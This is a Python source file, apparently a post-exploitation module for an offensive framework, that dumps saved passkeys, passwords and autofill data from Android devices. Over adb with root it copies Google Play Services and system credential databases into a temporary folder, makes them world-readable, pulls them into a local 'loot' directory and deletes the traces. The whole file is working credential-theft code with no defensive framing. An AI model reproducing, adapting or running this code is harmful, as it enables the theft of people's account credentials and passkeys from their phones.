"""
ShadowFramework — Android Credential Manager Dump
Targets the modern Android Credential Manager API to extract saved passkeys and logins.
"""
import os
import subprocess
from rich.console import Console
from utils.logger import log_action

console = Console()

def _adb(dev, *args, timeout=20):
    cmd = ['adb', '-s', dev] + list(args)
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return r.stdout.strip(), r.stderr.strip(), r.returncode
    except subprocess.TimeoutExpired:
        return '', 'timeout', 1

class Module:
    MODULE_INFO = {
        'name': 'post/android/credential_manager_dump',
        'description': 'Extracts passkeys, saved passwords, and autofill data from Android Credential Manager.',
        'options': {
            'DEVICE_ID': 'Target device serial',
            'EXTRACT_PASSKEYS': 'Attempt passkey extraction [default: true]',
        }
    }

    def __init__(self, framework):
        self.framework = framework

    def run(self):
        device_id = self.framework.options.get('DEVICE_ID', '')
        if not device_id:
            out, _, _ = _adb('', 'devices')
            for line in out.splitlines()[1:]:
                if '\tdevice' in line:
                    device_id = line.split('\t')[0]
                    break
        if not device_id:
            console.print("[red][!] No device found.[/red]")
            return

        console.print(f"[cyan][*] Dumping Credential Manager data from {device_id}...[/cyan]")
        log_action(f"Credential Manager dump on {device_id}")

        # Targeted databases for modern Android credentials
        cred_paths = [
            '/data/data/com.google.android.gms/databases/credentials.db',
            '/data/data/com.google.android.gms/databases/dg.db',
            '/data/data/com.google.android.gms/databases/auth.db',
            '/data/system/users/0/creds.db'
        ]

        # Use su to pull if possible
        for path in cred_paths:
            filename = os.path.basename(path)
            console.print(f"  [cyan]→ Attempting to pull {filename}...[/cyan]")
            out, _, rc = _adb(device_id, 'shell', 'su', '-c', f'cat {path} > /data/local/tmp/{filename} && chmod 666 /data/local/tmp/{filename}')
            if rc == 0:
                _, _, rc2 = _adb(device_id, 'pull', f'/data/local/tmp/{filename}', f'loot/creds/{device_id}_{filename}')
                if rc2 == 0:
                    console.print(f"    [bold green][+] Successfully exfiltrated: {filename}[/bold green]")
                _adb(device_id, 'shell', 'rm', f'/data/local/tmp/{filename}')
            else:
                console.print(f"    [red][!] Permission denied (Root required).[/red]")

        console.print("\n[bold green][+] Credential extraction complete. Files saved in loot/creds/[/bold green]")
